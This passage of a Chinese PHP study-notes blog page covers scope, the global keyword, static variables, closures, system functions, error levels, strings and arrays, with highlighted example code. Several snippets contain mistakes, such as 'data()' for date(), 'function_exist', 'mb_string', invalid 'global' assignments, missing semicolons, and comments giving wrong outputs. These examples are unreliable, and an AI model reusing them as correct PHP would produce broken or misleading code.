class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$num1</span>-<span class="variable">$num</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 上述实参形参的传递相当于值传递，函数内部改变变量的内容，不会影响外面变量的内容</span></span><br><span class="line"><span class="comment">// 引用传递：可在函数内部改变外部变量</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">yinyong</span>(<span class="params"><span class="variable">$a</span>,&amp;<span class="variable">$b</span></span>)   // 函数要的是地址，故将外部变量<span class="title">b</span>存储的地址取出赋值给了形参</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$b</span> = <span class="variable">$b</span> - <span class="number">1</span>;</span><br><span class="line">    <span class="variable">$a</span> = <span class="variable">$a</span> -<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="number">10</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="number">5</span>;</span><br><span class="line"><span class="title function_ invoke__">yinyong</span>(<span class="variable">$a</span>,<span class="variable">$b</span>);    <span class="comment">// 注意：此处不取地址..另，引用传递不可传入数字（常量中存储的不是地址）</span></span><br></pre></td></tr></table></figure>

<h3 id="函数返回值"><a href="#函数返回值" class="headerlink" title="函数返回值"></a>函数返回值</h3><h3 id="作用域（与c差别在于全局变量不能直接被函数调用）"><a href="#作用域（与c差别在于全局变量不能直接被函数调用）" class="headerlink" title="作用域（与c差别在于全局变量不能直接被函数调用）"></a>作用域（与c差别在于全局变量不能直接被函数调用）</h3><p>作用域：通常是指变量可以被访问的区域。</p>
<p>在PHP中，作用域严格分为两种，以及内部定义的一种</p>
<p>1、全局变量：所属全局空间，在PHP中只允许在全局空间使用，函数内部不可用。（c++可使用）</p>
<p>2、局部变量：函数内部的变量</p>
<p>3、超全局变量：预定义变量（系统定义的）,没有访问限制，能够帮助局部去访问全局变量。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span> php</span><br><span class="line"></span><br><span class="line"><span class="comment">// php中作用域</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 默认的代码空间：全局空间</span></span><br><span class="line"><span class="variable">$global</span> = <span class="string">&#x27;global area&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 局部变量（函数内部定义）</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">display</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$inner</span> = <span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 访问全局变量</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$global</span>;   <span class="comment">// 函数内部不能访问全局变量</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 转化为超全局变量，使得函数内部可以访问</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$GLOBALS</span>[<span class="string">&#x27;global&#x27;</span>];  <span class="comment">// 这样可访问</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">display</span>();</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>想在函数内部访问全局变量，可通过$GLOBALS，也可使用引用传值。</strong></p>
<p>另，还有一种方式既可从全局访问局部、也可从局部访问全局。即，<strong>global关键字</strong>：</p>
<p>1、若使用global定义的关键字在外部存在，那么系统在函数内部定义的变量直接指向外部变量所指向的内存空间（同一个变量）。</p>
<p>2、若其定义的变量在外部不存在，系统会自动在全局空间定义一个与局部变量同名的全局变量。</p>
<p>本质为：在函数的内部和外部，对一个同名变量使用同一块内存地址保存数据。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span> php</span><br><span class="line"></span><br><span class="line"><span class="comment">// global关键字的应用</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 默认的代码空间：全局空间</span></span><br><span class="line"><span class="variable">$global</span> = <span class="string">&#x27;global area&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 局部变量（函数内部定义）</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">display</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 访问全局变量</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$global</span>;   <span class="comment">// 函数内部不能访问全局变量</span></span><br><span class="line">    </span><br><span class="line">   <span class="comment">// 1、全局变量存在</span></span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$global</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$global</span>;    <span class="comment">// 此时可以调用全局变量</span></span><br><span class="line">   <span class="comment">//2、全局变量不存在</span></span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$local</span> = <span class="string">&#x27;inner&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$local</span>;   <span class="comment">// 访问局部变量</span></span><br><span class="line"><span class="title function_ invoke__">display</span>();</span><br></pre></td></tr></table></figure>

<h3 id="静态变量"><a href="#静态变量" class="headerlink" title="静态变量"></a>静态变量</h3><p>静态变量：static是在函数内部定义的变量，使用static关键字修饰，用来实现夸函数共享数据的变量（注：跨函数是指同个函数多次调用）。</p>
<p><strong>静态变量原理：系统在进行编译的时候，就已经对static这一行进行了初始化：即为静态变量赋值。。。而在执行时，会跳过初始化这一行。</strong></p>
<h3 id="可变函数（未写全）"><a href="#可变函数（未写全）" class="headerlink" title="可变函数（未写全）"></a>可变函数（未写全）</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 可变函数:当前有一个变量所保存的值，刚好是一个函数的名字，那么就可以使用$变量()来充当函数名使用。</span></span><br><span class="line"><span class="comment">// 可变函数在使用系统函数时，需用户在外部定义一个自定义函数，但是需要传入到系统函数内部使用。</span></span><br><span class="line"><span class="comment">// 定义函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">display</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="keyword">__FUNCTION__</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义变量</span></span><br><span class="line"><span class="variable">$func</span> = <span class="string">&#x27;display&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 可变函数</span></span><br><span class="line"><span class="variable">$func</span>();</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="匿名函数"><a href="#匿名函数" class="headerlink" title="匿名函数"></a>匿名函数</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 匿名函数：没有名字的函数，</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">// 定义基本匿名函数</span></span><br><span class="line"><span class="comment">// function()  // 没有办法运行，故须加一个变量名字</span></span><br><span class="line"><span class="comment">// 变量保存匿名函数，本质得到的是一个对象（closure类中的对象）</span></span><br><span class="line"><span class="variable">$func</span> = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;hello world&#x27;</span>;</span><br><span class="line">&#125;;         <span class="comment">// 因为相当于变量的赋值，所以需加一个分号</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用匿名函数</span></span><br><span class="line"><span class="variable">$func</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">闭包：要执行的代码块（由于自由变量被包含在代码块中，这些自由变量以及它们引用的对象没有被释放）和为自由变量提供绑定地计算环境。（简单理解就是说，函数内部的一些局部变量即要执行的代码块，在执行完毕后没有被释放）。没有被释放的原因是：在函数内部，还有对应的函数被引用，通常为匿名函数。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 闭包函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">display</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$name</span> == <span class="keyword">__FUNCTION__</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 定义匿名函数</span></span><br><span class="line">    <span class="comment">// $innerfunction = function()// $name 相对于匿名函数来说是外部变量，故不能直接用</span></span><br><span class="line">    <span class="comment">// 1、使用匿名函数    2、使用关键字use</span></span><br><span class="line">    <span class="variable">$innerfunction</span> = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) <span class="keyword">use</span>(<span class="params"><span class="variable">$name</span></span>)  // <span class="keyword">use</span>就是将局部变量 保留给内部使用（形成了闭包，使<span class="title">display</span>运行完                                                毕后，不会被释放）</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$name</span>;     </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$innerfunction</span>();  </span><br><span class="line">    <span class="comment">// 3、 匿名函数返回给外部使用</span></span><br><span class="line">    <span class="keyword">return</span>  <span class="variable">$innerfunction</span>();    <span class="comment">// 为验证局部变量未被释放而返回</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="variable">$closure</span> = <span class="title function_ invoke__">display</span>();   <span class="comment">// 理论上此处局部变量被释放</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$closure</span>();   <span class="comment">// 结果却输出了name，说明上一行并未释放局部变量</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 如何证明局部变量在函数使用完之后没有被释放？（三步法）</span></span><br><span class="line"><span class="comment">// 1、使用内部匿名函数</span></span><br><span class="line"><span class="comment">// 2、匿名函数使用句变量：use</span></span><br><span class="line"><span class="comment">// 3、匿名函数返回给外部使用。</span></span><br></pre></td></tr></table></figure>

<h3 id="伪类型"><a href="#伪类型" class="headerlink" title="伪类型"></a>伪类型</h3><p>PHP中不存在的类型，只是为了方便查看操作手册。（可当作模板，只是为了泛化数据类型）</p>
<p>伪类型有两类:mixed混合的，只要是php中的类型即可；numbe数值的</p>
<h3 id="常用系统函数"><a href="#常用系统函数" class="headerlink" title="常用系统函数"></a>常用系统函数</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 系统函数</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出相关</span></span><br><span class="line"><span class="comment">// print():类似于echo输出提供的内容，本质是一种结构（非函数），返回值为1</span></span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">print</span>(<span class="string">&#x27;hello lewao&#x27;</span>);   <span class="comment">// 输出hello world</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;hello lewao&#x27;</span>;         <span class="comment">// 输出1hello world（1为上一行echo的输出）</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// print_r()：类似于var_dump，但不会输出数据类型，只会输出值，数组打印使用较多。</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="string">&#x27;hello&#x27;</span>);            <span class="comment">// 输出为hello</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//时间函数</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">data</span>(<span class="string">&#x27;Y 年 m 月 d 日&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">time</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">microtime</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 数学函数：  max()、rand():指定范围里的随机整数、round()：四舍五入、ceil():向上取整、floor()向下取整、pow(2,8):2的8次方、abs()：绝对值、sqrt()：求平方根</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 有关函数的函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"><span class="variable">$a</span>,<span class="variable">$b</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 获取指定参数</span></span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">func_get_arg</span>(<span class="number">1</span>));    <span class="comment">// 得到了第二个参数，结果为：string(1) &#x27;2&#x27;;</span></span><br><span class="line">    <span class="comment">// 获取所有参数:对应实参的个数</span></span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">func_get_args</span>());    <span class="comment">// array(4)&#123;   &#125;</span></span><br><span class="line">    <span class="comment">// 获取参数数量：对应实参的个数</span></span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">func_num_args</span>());    <span class="comment">// 参数数量 int(4)</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 调用(如果存在的话，执行test)</span></span><br><span class="line"><span class="title function_ invoke__">function_exist</span>(<span class="string">&#x27;test&#x27;</span>) &amp;&amp; <span class="title function_ invoke__">test</span>(<span class="number">1</span>,<span class="string">&#x27;2&#x27;</span>,<span class="number">3</span>,<span class="number">4</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="错误处理"><a href="#错误处理" class="headerlink" title="错误处理"></a>错误处理</h2><p>错误处理：指系统或用户在对某些代码进行执行的时候，发现有错误，就会通过错误处理的形式告诉程序员。</p>
<h3 id="错误分类"><a href="#错误分类" class="headerlink" title="错误分类"></a>错误分类</h3><p>1、语法错误：书写代码不符合PHP语法规范，会导致代码在编译中不允许，故也不会执行（parse error）；</p>
<p>2、运行时错误：代码编译通过，但在执行时会出现一些条件不满足从而导致的错误。（runtime error取空数组的第几位数）</p>
<p>3、逻辑错误：写代码不规范、但逻辑性错误，导致虽可正常运行，但得不到预期结果。</p>
<h3 id="错误代号"><a href="#错误代号" class="headerlink" title="错误代号"></a>错误代号</h3><p>系统代号在PHP中均被定义为了系统常量，故可直接使用：</p>
<p>1、系统错误（系统使用的代号）：</p>
<p>E_PARSE：编译错误，代码不会运行</p>
<p>E_ERROR：fatal error致命错误，会在出错的位置断掉</p>
<p>E_WARNING：warning警告错误，不影响执行，但可能得不到预期结果</p>
<p>E_NOTICE：notice，通知错误、不影响代码执行</p>
<p>2、用户错误（用户使用的代号）：E_USER_ERROR、E_USER_WARNING、E_USER_NOTICE用户在使用自定义错误出发的时候，会使用道德错误代号。</p>
<p>3、E_ALL：代表所有错误</p>
<p>所有E开头的错误常量都由一个字节（8位）存储，且每一种错误占用一个位，故可进行位操作。</p>
<p>排除通知级别notice：E_ALL &amp; ~E_NOTICE 。。假设ALL全为1，那么与NOTICE取反再取与就可把其剔除</p>
<p>只要警告和同志：E_WARNING | E_NOTICE</p>
<h3 id="错误触发"><a href="#错误触发" class="headerlink" title="错误触发"></a>错误触发</h3><p>程序运行时触发：主要针对代码的语法错误和运行时错误。</p>
<p>人为触发：知道某些逻辑可能会出错，从而使用对应的代码编号来判断</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// php错误处理</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 人为触发</span></span><br><span class="line"><span class="comment">// 处理脚本让浏览器按照指定字符集解析</span></span><br><span class="line"><span class="comment">// header(&#x27;Content-type:text/html;charset=utf-8&#x27;);</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span> = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$b</span> == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">trigger_error</span>(<span class="string">&#x27;除数不能为0&#x27;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span> / <span class="variable">$b</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="错误显示设置（未全）"><a href="#错误显示设置（未全）" class="headerlink" title="错误显示设置（未全）"></a>错误显示设置（未全）</h3><h2 id="字符串类型"><a href="#字符串类型" class="headerlink" title="字符串类型"></a>字符串类型</h2><h3 id="字符串定义语法"><a href="#字符串定义语法" class="headerlink" title="字符串定义语法"></a>字符串定义语法</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//php字符串：定义</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 1、引号定义:比较适合定义较短的或无结构要求的字符串</span></span><br><span class="line"><span class="variable">$str1</span> = <span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line"><span class="variable">$str2</span> = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$str1</span>,<span class="variable">$str2</span>);  <span class="comment">// 两种方式显示的结果一致</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 结构化定义</span></span><br><span class="line"><span class="comment">// 2、heredoc字符串：没有单引号的单引号字符串</span></span><br><span class="line"><span class="variable">$str3</span> = <span class="string">&lt;&lt;&lt;EOD</span></span><br><span class="line"><span class="string">          HELLO</span></span><br><span class="line"><span class="string">          EOD</span>;</span><br><span class="line"><span class="comment">// 3、nowdoc 结构</span></span><br><span class="line"><span class="variable">$str4</span> = &lt;&lt;&lt;<span class="string">&#x27;EOD&#x27;</span>   <span class="comment">// eod只是边界符，可自己定义</span></span><br><span class="line">           hello</span><br><span class="line">EOD;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$str3</span>,<span class="variable">$str4</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="转义字符串"><a href="#转义字符串" class="headerlink" title="转义字符串"></a>转义字符串</h3><p>字符串转义：在计算机通用协议中，有一些特定方式定义的字母，系统会特定处理；反斜杠+字母<br>&#39;:在单引号字符串中显示单引号  &quot; 在双引号字符串中显示双引号  \r：回车  \n：换行  \t:四个空格  $<br>**区别:**上述转义符中，单引号只能识别&#39;。而双引号中不能识别&#39;；</p>
<p>双引号中变量识别规则：</p>
<p>1、变量本身系统能够与后面的内容区分；即应该保证变量的独立性，不要使系统难以识别。</p>
<p>2、使用变量专业标识符，即给变量加一组{}；</p>
<p>结构化字符串变量的规则</p>
<p>1、结构化定义字符串对应的边界符有条件</p>
<p>1.1 上边界符和后面不能有任何东西（包括注释）</p>
<p>1.2 下边界符必须顶格</p>
<p>1.3 下边界符后面只能跟分号</p>
<p>2、结构化定义字符串内部均是字符串本身（包括空格、换行、注释等）</p>
<h3 id="字符串长度问题"><a href="#字符串长度问题" class="headerlink" title="字符串长度问题"></a>字符串长度问题</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-type:text/html;charset = utf-8&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义字符串</span></span><br><span class="line"><span class="variable">$str1</span> = <span class="string">&#x27;abcefjdoifaoi&#x27;</span>;</span><br><span class="line"><span class="variable">$str2</span> = <span class="string">&#x27;你好中国123&#x27;</span>; </span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">strlen</span>(<span class="variable">$str1</span>),<span class="string">&#x27;&lt;br/&gt;&#x27;</span>,<span class="title function_ invoke__">strlen</span>(<span class="variable">$str2</span>);  <span class="comment">// 13   15(中文在utf下占3个字节)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 多字节字符串的长度问题：包含中文的长度</span></span><br><span class="line"><span class="comment">// 多字节字符串扩展模块：mbstring扩展(mb:Multi Bytes)</span></span><br><span class="line"><span class="comment">// 首先需加载PHP的mbstring扩展（php.ini中去注释即可）</span></span><br><span class="line"><span class="comment">// 使用mbstring</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mb_strlen</span>(<span class="variable">$str1</span>),<span class="string">&#x27;&lt;br/&gt;&#x27;</span>,<span class="title function_ invoke__">mb_strlen</span>(<span class="variable">$str2</span>);  <span class="comment">// 13   15(与之前一致) </span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 长度并未改变，MBstring针对不同的字符集有不同的统计结果</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mb_strlen</span>(<span class="variable">$str1</span>),<span class="string">&#x27;&lt;br/&gt;&#x27;</span>,<span class="title function_ invoke__">mb_strlen</span>(<span class="variable">$str2</span>),<span class="string">&#x27;&lt;br/&gt;&#x27;</span>,<span class="title function_ invoke__">mb_string</span>(<span class="variable">$str2</span>,<span class="string">&#x27;utf-8&#x27;</span>);  <span class="comment">// 13   15   7</span></span><br></pre></td></tr></table></figure>

<h3 id="字符串相关函数"><a href="#字符串相关函数" class="headerlink" title="字符串相关函数"></a>字符串相关函数</h3><h2 id="数组（元素下标均和c-不一样）"><a href="#数组（元素下标均和c-不一样）" class="headerlink" title="数组（元素下标均和c++不一样）"></a>数组（元素下标均和c++不一样）</h2><p>数组：数据的组合，指将一组数据（多个）存储到一个指定的容器中，并用变量指向该容器，然后可用变量一次性取得该容器的所有数据。</p>
<h3 id="定义语法"><a href="#定义语法" class="headerlink" title="定义语法"></a>定义语法</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// php数组：可以是一种或多种类型的数据，这与c++很不一样.类似于哈希表</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">// 定义数组：array</span></span><br><span class="line"><span class="variable">$arr1</span> = <span class="keyword">array</span>(<span class="string">&#x27;1&#x27;</span>,<span class="number">2</span>,<span class="string">&#x27;hello&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$arr1</span>);    <span class="comment">// 结果：// array(3) ([0]=&gt;string(1) &quot;1&quot; [1]=&gt;int(2) [2]=&gt;string(5) &quot;hello&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义数组：[]</span></span><br><span class="line"><span class="variable">$arr2</span> = [<span class="string">&#x27;1&#x27;</span>,<span class="number">2</span>,<span class="string">&#x27;hello&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$arr2</span>);   <span class="comment">// array(3) ([0]=&gt;string(1) &quot;1&quot; [1]=&gt;int(2) [2]=&gt;string(5) &quot;hello&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义数组：隐型数组  </span></span><br><span class="line"><span class="variable">$arr3</span>[] = <span class="number">1</span>;      <span class="comment">// 默认给数组第0个元素赋值</span></span><br><span class="line"><span class="variable">$arr3</span>[<span class="number">10</span>] = <span class="number">100</span>;  <span class="comment">// 第10个元素赋值</span></span><br><span class="line"><span class="variable">$arr3</span>[] = <span class="string">&#x27;1&#x27;</span>;    <span class="comment">// 第11个。默认下标是从当前最大下标</span></span><br><span class="line"><span class="variable">$arr</span>[<span class="string">&#x27;key&#x27;</span>] = <span class="string">&#x27;key&#x27;</span>;  <span class="comment">// 第key个</span></span><br><span class="line"><span class="variable">$arr</span>[<span class="number">1</span>] = <span class="string">&#x27;value&#x27;</span>  <span class="comment">// 第1个，但不会自动调整，还是会处于最后一个位置</span></span><br><span class="line"><span class="comment">// 结果为：array(4) ([0]=&gt;int(1) [10]=&gt;int(100) [11]=&gt;string(1) &quot;1&quot; [&quot;key&quot;]=&gt;string(3)&quot;key&quot; [1]=&gt;string(5) &quot;value&quot;)</span></span><br></pre></td></tr></table></figure>

<h3 id="PHP数组特点"><a href="#PHP数组特点" class="headerlink" title="PHP数组特点"></a>PHP数组特点</h3><p>1、可以整数下标或者字符串下标</p>
<p>若数组下标均为整数，则称为<strong>索引数组</strong></p>
<p>若数组下标均为字符串，则称为<strong>关联数组</strong>。</p>
<p>混合下标的话称为<strong>混合数组</strong></p>
<p>2、数组元素的顺序以放入顺序为准，与下标无关</p>
<p>3、数字下标的增长特性：从0开始自动增长，若中间手动加入较大的下标，则后面则会从当前最大下标+1增长。</p>
<p>4、特殊值下标的自动转换</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 特殊下标自动转换</span></span><br><span class="line"><span class="variable">$arr1</span>[<span class="literal">false</span>] = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$arr1</span>[<span class="literal">true</span>] = <span class="literal">true</span>;</span><br><span class="line">arr1[<span class="literal">NULL</span>] = <span class="literal">NULL</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$arr1</span>);   <span class="comment">// array(3)([0]=&gt;bool(false),[1]=&gt;bool(true) [&quot;&quot;]-&gt;NULL)</span></span><br></pre></td></tr></table></figure>

<p>5、PHP数组中类型元素没有限制。</p>
<p>6、PHP中数组元素没有长度限制。c++ vector</p>
<p>补充：PHP中数组是很大的数据，故会存储在堆区。</p>
<h3 id="多维数组"><a href="#多维数组" class="headerlink" title="多维数组"></a>多维数组</h3><h3 id="数组遍历"><a href="#数组遍历" class="headerlink" title="数组遍历"></a>数组遍历</h3><h4 id="Foreach语法"><a href="#Foreach语法" class="headerlink" title="Foreach语法"></a>Foreach语法</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">// 数组遍历  foreach</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// foreach</span></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$arr</span> <span class="keyword">as</span> <span class="variable">$a</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$a</span>,<span class="string">&#x27;&lt;br/&gt;&#x27;</span>;    <span class="comment">// 依次输出1，2，3，4</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$arr</span> <span class="keyword">as</span> <span class="variable">$a</span> =&gt; <span class="variable">$v</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;key&#x27;</span>,<span class="variable">$a</span>,<span class="string">&#x27;== value&#x27;</span>,<span class="variable">$v</span>,<span class="string">&#x27;&lt;br/&gt;&#x27;</span>;    <span class="comment">// 依次输出key0 == value1  等</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 二维数组</span></span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(</span><br><span class="line">	<span class="number">0</span> =&gt; <span class="keyword">array</span>(<span class="string">&#x27;name&#x27;</span> =&gt;<span class="string">&#x27;Tom&#x27;</span>,<span class="string">&#x27;age&#x27;</span> =&gt; <span class="number">10</span>),</span><br><span class="line">    <span class="number">1</span> =&gt; <span class="keyword">array</span>(<span class="string">&#x27;name&#x27;</span> =&gt; <span class="string">&#x27;Jim&#x27;</span>,<span class="string">&#x27;age&#x27;</span> =&gt; <span class="number">11</span>)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 通过foreach遍历二维元素</span></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$arr</span> <span class="keyword">as</span> <span class="variable">$a</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;name is:&#x27;</span>,<span class="variable">$a</span>[<span class="string">&#x27;name&#x27;</span>],<span class="string">&#x27;age is:&#x27;</span>,<span class="variable">$a</span>[<span class="string">&#x27;age&#x27;</span>],<span class="string">&#x27;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">    <span class="comment">// name is:TOM age is:10</span></span><br><span class="line">    <span class="comment">// name is:TOM age is:10</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="foreach遍历原理"><a href="#foreach遍历原理" class="headerlink" title="foreach遍历原理"></a>foreach遍历原理</h4><h4 id="for循环遍历"><a href="#for循环遍历" class="headerlink" title="for循环遍历"></a>for循环遍历</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">// for循环遍历数组</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 数组特点：1、索引数组   2、下标规律</span></span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span>&lt;<span class="title function_ invoke__">count</span>(<span class="variable">$arr</span>);<span class="variable">$i</span>++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;key is:&#x27;</span>,<span class="variable">$i</span>,<span class="string">&#x27;value is:&#x27;</span>,<span class="variable">$arr</span>[<span class="variable">$i</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="while配合each和list遍历数组"><a href="#while配合each和list遍历数组" class="headerlink" title="while配合each和list遍历数组"></a>while配合each和list遍历数组</h4><p>由于不存在下标1，而list只能从0开始依次查找，故上述会报错。</p>
